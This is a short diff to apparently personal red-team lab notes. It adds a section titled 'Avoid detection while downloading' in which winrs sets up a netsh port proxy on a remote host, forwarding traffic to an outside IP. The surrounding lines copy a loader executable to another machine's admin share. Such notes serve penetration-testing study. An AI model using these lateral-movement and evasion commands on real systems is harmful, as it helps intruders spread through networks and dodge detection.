@@ -20,3 +20,8 @@ Connect Using Win-rs
 ```powershell
 echo F | xcopy C:\Users\Public\Loader.exe \\<R MACHINE>\C$\Users\Public\Loader.exe
 ```
+
+### **Avoid detection while downloading**
+```powershell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+```
